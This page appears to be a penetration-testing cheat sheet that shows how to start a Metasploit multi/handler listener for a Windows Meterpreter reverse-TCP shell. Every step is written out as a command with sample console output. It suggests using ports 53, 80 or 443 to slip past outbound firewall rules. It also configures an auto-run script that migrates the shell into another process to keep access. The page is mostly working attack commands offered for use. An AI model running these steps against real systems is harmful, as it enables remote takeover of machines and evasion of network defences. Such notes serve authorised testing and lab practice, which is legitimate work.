---
title: "Metasploit Listener"
date: 2024-6-26
tags: ["Metasploit", "Firewall", "Reverse Shell", "Shellcode", "Listener", "Reverse Shell", "Msfconsole"]
---

### Start a Metasploit Listener

```console
msfconsole -q
```

```console {class="sample-code"}
$ msfconsole -q
msf6 >
```

```console
use exploit/multi/handler
```

```console {class="sample-code"}
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
```

```console
set payload windows/meterpreter/reverse_tcp
```

```console {class="sample-code"}
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```

```console
set lhost <LOCAL_IP>
```

```console {class="sample-code"}
msf6 exploit(multi/handler) > set lhost 10.10.14.31
lhost => 10.10.14.31
```

```console
set lport <LOCAL_PORT>
```

```console {class="sample-code"}
msf6 exploit(multi/handler) > set lport 1337
lport => 1337
```

```console
run
```

```console {class="sample-code"}
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.31:1337 
```

<small>*Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules*</small>

### If the shell die immediately, we can try to migrate it to another process

```console
# Create a automigrate.rc script
run post/windows/manage/migrate
```

```console {class="sample-code"}
$ cat automigrate.rc 
run post/windows/manage/migrate
```

<br>

```console
msfconsole -q
```

```console {class="sample-code"}
$ msfconsole -q
msf6 >
```

```console
use exploit/multi/handler
```

```console {class="sample-code"}
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
```

```console
set payload windows/meterpreter/reverse_tcp
```

```console {class="sample-code"}
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```

```console
set lhost <LOCAL_IP>
```

```console {class="sample-code"}
msf6 exploit(multi/handler) > set lhost 10.10.14.31
lhost => 10.10.14.31
```

```console
set lport <LOCAL_PORT>
```

```console {class="sample-code"}
msf6 exploit(multi/handler) > set lport 1337
lport => 1337
```

```console
set AutoRunScript multi_console_command -r automigrate.rc
```

```console {class="sample-code"}
msf6 exploit(multi/handler) > set AutoRunScript multi_console_command -r automigrate.rc
AutoRunScript => multi_console_command -r automigrate.rc
```

```console
run
```

```console {class="sample-code"}
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.31:1337 
```